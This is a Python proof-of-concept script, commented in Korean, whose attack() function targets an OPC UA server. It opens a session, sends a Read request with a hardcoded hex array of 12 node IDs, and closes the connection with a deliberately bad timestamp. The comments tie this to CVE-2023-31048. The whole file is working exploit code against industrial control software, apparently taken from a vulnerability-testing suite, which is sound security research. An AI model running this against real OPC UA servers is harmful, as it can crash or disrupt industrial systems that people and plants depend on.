import datetime

from protocol import *  # OPC UA 프로토콜 관련 모듈
from config import *  # 설정값을 포함하는 모듈

# attack 함수는 Bad Timestamp를 포함한 메시지를 전송하여 서버의 취약점을 유발하는 공격입니다.
# 이 공격은 CVE-2023-31048과 관련된 취약점을 테스트합니다.
def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    # OPC UA 세션 생성
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 메시지 준비 (헤더 및 본문)
    message_header = opcua.build_opcua_message_header()  # OPC UA 메시지 헤더 생성
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=631)  # OPC UA 메시지 본문 생성
    message_body += struct.pack("<Q", 0)  # Max age (0으로 설정)
    message_body += struct.pack("<I", 3)  # Timestamp to return (3 = Neither, 타임스탬프 반환 안함)

    # 읽을 노드 ID 목록 (12개의 NodeIDs를 포함한 배열)
    nodes_to_read = bytes.fromhex(
        "0c0000000100b73a05000000ffffffff0000ffffffff0100b93a05000000ffffffff0000ffffffff0100203e05000000ffffffff0000ffffffff0100df3c05000000ffffffff0000ffffffff01001a3d05000000ffffffff0000ffffffff01001e3d05000000ffffffff0000ffffffff0100263d05000000ffffffff0000ffffffff01002a3d05000000ffffffff0000ffffffff005e05000000ffffffff0000ffffffff01002e3c05000000ffffffff0000ffffffff005f05000000ffffffff0000ffffffff01005b0105000000ffffffff0000ffffffff"
    )

    # 메시지 결합 (헤더, 본문, 읽을 노드)
    message = message_header + message_body + nodes_to_read

    # 요청 전송 (1번 전송)
    print("[-] Sending MSG Request - Read Array of 12 NodeIDs x {} times".format(1))
    opcua.send_recv(message, count=1, should_recv=True)

    time.sleep(0.2)  # 서버 응답 대기

    # 연결 종료 메시지 전송 (잘못된 타임스탬프를 사용)
    print("[-] Closing connection")
    opcua.close_connection(should_wait=True, use_old_timestap=True, should_print_result=True)
    opcua.sock.close()  # 소켓 종료
